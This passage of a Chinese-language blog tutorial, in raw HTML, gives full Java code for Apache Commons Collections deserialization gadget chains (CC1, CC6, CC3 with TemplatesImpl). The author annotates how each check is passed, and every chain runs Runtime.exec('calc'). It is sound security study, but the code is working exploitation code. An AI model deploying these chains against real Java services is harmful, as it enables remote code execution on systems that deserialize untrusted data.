class="comment">//需要满足readObject里面的!(memberType.isInstance(value)，而Target里有的是value，因此要修改key为value</span></span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 这里不能用Override是因为readObject里面有个判断memberType != null</span></span><br><span class="line"><span class="comment">//        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);</span></span><br><span class="line">        <span class="comment">// 还有个!(memberType.isInstance(value)要满足（其实就是判断memberType和value这两个东西能不能强转）</span></span><br><span class="line">        <span class="comment">// 而Target里有的是value，因此要修改前面map里的key</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 到这里我们已经过掉了前面的所有判断，只面临最后一个问题，那就是传入的类是一个AnnotationTypeMismatchExceptionProxy</span></span><br><span class="line">        <span class="comment">// 而我们需要的是一个Runtime.class，这时我们可以使用ConstantTransformer，它始终会返回我们传入的对像</span></span><br><span class="line">        <span class="comment">// 所以只需要在最前面的链子处加一个ConstantTransformer即可</span></span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个点有疑问，在这一段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>发现<code>invoke</code>的第一个参数乱填都可以，原因在这里</p><p><img src="https://img.gejiba.com/images/8b6e2e040dd55234485a9c1cc9386144.png" alt="8b6e2e040dd55234485a9c1cc9386144.png"></p><p>而对应的方法确实是静态方法，所以第一个参数无所谓了</p><p><img src="https://img.gejiba.com/images/258976f994bd63e3c741a2786e6cdf61.png" alt="258976f994bd63e3c741a2786e6cdf61.png"></p><h2 id="LazyMap版"><a href="#LazyMap版" class="headerlink" title="LazyMap版"></a>LazyMap版</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 注解可以乱填，因为动态代理的invoke只需要在readObject种执行一个无参方法即可触发，不需要过后面的判断</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 这里动态代理一个LazyMap可以实现readObject-&gt;invoke-&gt;get</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>jdk8u71</code>中修复了<code>AnnotationInvocationHandler</code>类的里的<code>readObject</code>方法，所以<code>CC1</code>不能继续使用了</p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 改成ConstantTransformer是为了防止put的时候就被使用</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;evo2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化的时候需要这个key来过掉LazyMap.get中的map.containsKey(key) == false</span></span><br><span class="line">        <span class="comment">// 但是序列化后这个key会被放进去，所以需要再去掉</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><h2 id="CC3Test-java"><a href="#CC3Test-java" class="headerlink" title="CC3Test.java"></a>CC3Test.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">// 1. 加载恶意类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/cn/evo1/cc/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 其实_tfactory在readObject中会被赋值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. ysoserial中的CC3，使用InstantiateTransformer和TrAXFilter</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// ConstantTransformer最后调用时需要，前面按流程写链子时可先不写</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 注解可以乱填，因为动态代理的invoke只需要在readObject种执行一个无参方法即可触发，不需要过后面的判断</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 这里动态代理一个LazyMap可以实现readObject-&gt;invoke-&gt;get</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 直接套CC6(直接套CC1也可以)</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers = new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                // ConstantTransformer最后调用时需要，前面按流程写链子时可先不写</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(templates),</span></span><br><span class="line"><span class="comment">//                new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"><span class="comment">////        chainedTransformer.transform(1);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;evo1&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map2.put(tiedMapEntry,&quot;evo2&quot;);</span></span><br><span class="line"><span class="comment">//        lazyMap.remove(&quot;evo1&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Class c = LazyMap.class;</span></span><br><span class="line"><span class="comment">//        Field factory = c.getDeclaredField(&quot;factory&quot;);</span></span><br><span class="line"><span class="comment">//        factory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        factory.set(lazyMap,chainedTransformer);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC1</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);</span></span><br><span class="line"><span class="comment">//        annotationInvocationHandlerConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        // 注解可以乱填，因为动态代理的invoke只需要在readObject种执行一个无参方法即可触发，不需要过后面的判断</span></span><br><span class="line"><span class="comment">//        InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span></span><br><span class="line"><span class="comment">//        // 这里动态代理一个LazyMap可以实现readObject-&gt;invoke-&gt;get</span></span><br><span class="line"><span class="comment">//        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,h);</span></span><br><span class="line"><span class="comment">//        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Calc-java"><a href="#Calc-java" class="headerlink" title="Calc.java"></a>Calc.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在defineTransletClasses中要满足superClass.getName().equals(ABSTRACT_TRANSLET)</span></span><br><span class="line"><span class="comment">// 所以这里要继承下AbstractTranslet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 